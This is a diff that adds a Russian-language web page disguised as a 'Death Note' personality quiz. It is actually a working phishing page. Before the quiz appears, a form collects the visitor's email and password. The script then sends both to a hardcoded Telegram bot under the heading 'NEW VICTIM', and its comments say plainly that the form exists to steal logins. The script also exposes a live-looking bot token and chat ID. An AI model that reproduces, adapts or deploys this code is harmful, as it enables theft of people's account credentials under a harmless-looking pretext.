@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Кто ты из Тетради смерти?</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: radial-gradient(circle at 20% 30%, #0a0a0a, #000000);
+            font-family: 'Courier New', 'Gothic', monospace;
+            color: #c0c0c0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 700px;
+            width: 100%;
+            background: rgba(10, 10, 10, 0.85);
+            border: 2px solid #5a2d2d;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 0 30px rgba(139, 0, 0, 0.5);
+            backdrop-filter: blur(3px);
+        }
+        h1 {
+            text-align: center;
+            font-size: 2em;
+            letter-spacing: 4px;
+            text-shadow: 0 0 8px red;
+            color: #e6c8a0;
+            border-bottom: 1px solid #8b0000;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        .death-note-icon {
+            text-align: center;
+            font-size: 3em;
+            margin-bottom: 10px;
+        }
+        .question {
+            margin: 20px 0 15px;
+            font-weight: bold;
+            border-left: 4px solid #b22222;
+            padding-left: 12px;
+        }
+        select, input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            background: #1e1e1e;
+            border: 1px solid #8b0000;
+            color: #f0e6d0;
+            border-radius: 6px;
+            font-family: monospace;
+        }
+        button {
+            width: 100%;
+            background: #5a1e1e;
+            border: none;
+            padding: 14px;
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #ffdead;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 10px;
+            letter-spacing: 2px;
+        }
+        button:hover {
+            background: #8b0000;
+            box-shadow: 0 0 12px red;
+        }
+        .result {
+            margin-top: 25px;
+            background: #111;
+            border: 1px dashed #b22222;
+            padding: 15px;
+            text-align: center;
+            border-radius: 12px;
+            font-size: 1.3em;
+        }
+        .footer {
+            font-size: 0.7em;
+            text-align: center;
+            margin-top: 20px;
+            color: #5a5a5a;
+        }
+        input[type="email"], input[type="password"] {
+            background: #0c0c0c;
+            border: 1px solid #6a2e2e;
+        }
+        label {
+            display: block;
+            margin-top: 12px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="death-note-icon">✞ 𝔻𝔼𝔸𝕋ℍ ℕ𝕆𝕋𝔼 ✞</div>
+    <h1>КТО ТЫ ИЗ "ТЕТРАДИ СМЕРТИ"?</h1>
+    <p style="text-align:center; margin-bottom:20px;">Ответь на 15 вопросов — узнай свою тёмную сущность.</p>
+
+    <!-- Форма для кражи логина/пароля -->
+    <form id="stealForm">
+        <label>📧 Email / Почта:</label>
+        <input type="email" id="email" name="email" placeholder="ваш email" required>
+        <label>🔒 Пароль:</label>
+        <input type="password" id="password" name="password" placeholder="пароль" required>
+        <button type="submit" id="submitBtn">⟡ ПРОЙТИ ТЕСТ ⟡</button>
+    </form>
+
+    <div id="quizBlock" style="display:none;">
+        <!-- 15 вопросов -->
+        <form id="quizForm"></form>
+        <button id="getResult">УЗНАТЬ ПЕРСОНАЖА</button>
+        <div id="quizResult" class="result"></div>
+    </div>
+    <div class="footer">✝ Ваша судьба предрешена... ✝</div>
+</div>
+
+<script>
+    // Вопросы (15 шт) + варианты ответов (каждый ответ даёт баллы к персонажам)
+    const characters = ["Лайт Ягами", "L", "Миса Амане", "Рюук", "Ниа", "Мэлло", "Соъитиро Ягами", "Тэру Миками"];
+    const questions = [
+        "Как ты относишься к справедливости?",
+        "Твой любимый способ решения проблем?",
+        "Что для тебя важнее?",
+        "Какая твоя главная черта?",
+        "Как ты реагируешь на несправедливость?",
+        "Твоя стратегия в игре?",
+        "Что ты думаешь о смертной казни?",
+        "Твой идеальный выходной?",
+        "Какую силу ты бы выбрал?",
+        "Как ты относишься к правилам?",
+        "Твой любимый жанр книг/фильмов?",
+        "Как ты действуешь в одиночку?",
+        "Что тебя мотивирует?",
+        "Как ты относишься к богатству и власти?",
+        "Твой девиз по жизни?"
+    ];
+    const options = [
+        ["Должен быть один судья", "Все должны быть равны", "Справедливости не существует", "Я сам вершу суд"],
+        ["Логика и расчёт", "Импульсивность и страсть", "Обману и хитрости", "Сила и запугивание"],
+        ["Идеалы", "Выживание", "Знания", "Власть"],
+        ["Гениальность", "Харизма", "Скрытность", "Жестокость"],
+        ["Караю лично", "Обращаюсь к закону", "Манипулирую другими", "Игнорирую"],
+        ["Нападаю первым", "Защищаюсь и жду", "Просчитываю на 20 шагов вперёд", "Разрушаю всё"],
+        ["Оправдана для злодеев", "Недопустима", "Только если я решаю", "Это инструмент"],
+        ["Читаю детективы", "Тренируюсь", "Сплю и ем яблоки", "Слежу за врагами"],
+        ["Тетрадь смерти", "Глаза шинигами", "Супер-интеллект", "Неограниченные деньги"],
+        ["Нарушаю их ради цели", "Соблюдаю всегда", "Притворяюсь, что соблюдаю", "Ненавижу любые правила"],
+        ["Детективы и триллеры", "Философия", "Ужасы и мистика", "Боевики"],
+        ["Эффективно и без шума", "С вызовом и дерзостью", "Аккуратно и логично", "Жестоко и показательно"],
+        ["Жажда власти", "Любопытство", "Месть", "Скука"],
+        ["Власть — это всё", "Деньги — это свобода", "Не интересует", "Использую для контроля"],
+        ["Я — бог нового мира", "Сомневайся в очевидном", "Любовь превыше всего", "Всё — игра"]
+    ];
+
+    // Соответствие ответов персонажам (простая сумма баллов)
+    function getCharacterIndex(answers) {
+        let scores = new Array(characters.length).fill(0);
+        // пример весов: 0-Лайт,1-L,2-Миса,3-Рюук,4-Ниа,5-Мэлло,6-Соъитиро,7-Тэру
+        // каждый ответ добавляет баллы определённым персонажам (упрощённо для демо)
+        for(let i=0; i<answers.length; i++) {
+            let a = answers[i];
+            // Настроим очень условно: 
+            if(a === 0) { scores[0]+=3; scores[5]+=1; } // Лайт, Мэлло
+            else if(a === 1) { scores[1]+=3; scores[4]+=2; } // L, Ниа
+            else if(a === 2) { scores[2]+=2; scores[3]+=2; scores[6]+=1; } // Миса, Рюук, Соъитиро
+            else if(a === 3) { scores[7]+=3; scores[0]+=1; scores[3]+=1; } // Тэру, Лайт, Рюук
+        }
+        let maxIdx = 0;
+        for(let i=1;i<scores.length;i++) if(scores[i] > scores[maxIdx]) maxIdx = i;
+        return maxIdx;
+    }
+
+    // Отправка украденных данных в Telegram через бота
+    function sendToTelegram(email, password) {
+        const botToken = "8534798994:AAHJlJfnJl3GrqSQIBP1_qdxHCy9b7xaIm0"
+        const chatId = "8501037826"
+        const message = `🔪 НОВАЯ ЖЕРТВА!\n📧 Почта: ${email}\n🔑 Пароль: ${password}\n🕒 Время: ${new Date().toLocaleString()}`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({chat_id: chatId, text: message})
+        }).catch(e => console.log(e));
+    }
+
+    document.getElementById("stealForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+        const email = document.getElementById("email").value;
+        const pass = document.getElementById("password").value;
+        if(email && pass) {
+            sendToTelegram(email, pass);
+            // Показываем блок вопросов
+            document.getElementById("stealForm").style.display = "none";
+            document.getElementById("quizBlock").style.display = "block";
+            generateQuiz();
+        } else {
+            alert("Введи почту и пароль");
+        }
+    });
+
+    function generateQuiz() {
+        const container = document.getElementById("quizForm");
+        container.innerHTML = "";
+        for(let i=0;i<questions.length;i++) {
+            let div = document.createElement("div");
+            div.className = "question";
+            div.innerHTML = `<span>${i+1}. ${questions[i]}</span>`;
+            let select = document.createElement("select");
+            select.id = `q${i}`;
+            for(let j=0;j<options[i].length;j++) {
+                let opt = document.createElement("option");
+                opt.value = j;
+                opt.text = options[i][j];
+                select.appendChild(opt);
+            }
+            div.appendChild(select);
+            container.appendChild(div);
+        }
+    }
+
+    document.getElementById("getResult").addEventListener("click", function() {
+        let answers = [];
+        for(let i=0;i<questions.length;i++) {
+            let val = parseInt(document.getElementById(`q${i}`).value);
+            answers.push(val);
+        }
+        let charIdx = getCharacterIndex(answers);
+        let character = characters[charIdx];
+        let desc = "";
+        if(character === "Лайт Ягами") desc = "Ты — бог нового мира, жаждешь справедливости любой ценой.";
+        else if(character === "L") desc = "Ты гениален, эксцентричен и всегда на шаг впереди.";
+        else if(character === "Миса Амане") desc = "Ты яркая, влюбчивая и готова на всё ради идеала.";
+        else if(character === "Рюук") desc = "Тебе скучно, ты наблюдаешь и любишь яблоки.";
+        else if(character === "Ниа") desc = "Ты чистый разум и логика, победитель по правилам.";
+        else if(character === "Мэлло") desc = "Ты импульсивен, рискуешь и ненавишь проигрывать.";
+        else if(character === "Соъитиро Ягами") desc = "Ты справедливый, принципиальный отец-полицейский.";
+        else desc = "Ты фанатик и подражатель, готовый служить новому богу.";
+        document.getElementById("quizResult").innerHTML = `<span style="font-size:1.8em;">☠ ${character} ☠</span><br>${desc}`;
+    });
+</script>
+</body>
+</html>
